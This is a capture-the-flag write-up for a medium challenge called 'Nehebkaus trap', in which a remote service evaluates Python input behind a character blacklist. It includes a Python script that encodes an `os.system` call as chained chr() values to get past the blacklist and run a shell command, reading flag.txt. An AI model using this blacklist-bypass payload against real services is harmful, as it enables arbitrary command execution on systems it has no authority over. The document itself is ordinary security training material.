# Nehebkaus trap (medium)
For this challenge the remote allows us to send input.

After some trial and error I sent
`print(1)` and I got back 1 as the result. This seems like python evaluates whatever we input

Let's try `print('test')`!
Oh, this contains a blacklisted character :(

But parentheses work! We can construct any string we want by doing `chr(<ascii code>)+...+chr(<ascii code>)`
And luckily the `+` is also allowed.

Now all that is left to do is to encode our payload with the following method to get the flag:

```python
def obf(inp):
    ans = []
    for c in inp:
        ans.append(f'chr({ord(c)})')
    return '+'.join(ans)

shell_cmd = 'cat flag.txt'
eval_content = f'__import__("os").system("{shell_cmd}")'
command = f'print(eval({obf(eval_content)}))'

print(command)
```
